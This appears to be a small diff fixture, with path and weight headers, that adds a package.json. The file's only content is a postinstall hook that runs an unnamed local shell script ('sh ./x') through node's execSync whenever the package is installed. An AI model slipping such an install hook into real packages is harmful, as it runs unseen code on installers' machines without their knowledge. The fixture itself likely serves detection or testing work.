@@ -1,0 +1,9 @@
+# path: package.json
+# lines: 3
+# weight: 35
+# ---
+{
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').execSync('sh ./x')\""
+  }
+}
